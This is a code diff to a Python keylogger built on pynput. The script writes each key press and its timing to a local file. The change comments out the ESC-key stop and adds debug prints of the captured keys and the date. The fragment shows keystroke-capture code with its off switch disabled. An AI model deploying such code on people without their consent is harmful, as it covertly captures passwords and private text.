@@ -7,8 +7,11 @@ idle_duration = 0
 
 def on_press(key):
     global pressed_duration, key_pressed
-    if key == pynput.keyboard.Key.esc:
-        return False
+
+    # stop the keylogger when ESC is pressed
+    # if key == pynput.keyboard.Key.esc:
+    #     return False
+
     if key in key_pressed:
         return
     if key_pressed == {}:
@@ -16,6 +19,8 @@ def on_press(key):
 
     key_pressed[key] = key
     pressed_duration[key] = float("{:0.2f}".format(time.time()))
+
+    print(key_pressed)
 
     with open("keylogger.txt", "a") as f:
         f.write(f"START {key}\n")
@@ -54,4 +59,5 @@ def run():
         listener.join()
 
 if __name__ == "__main__":
+    print(datetime.datetime.now().date())
     run()
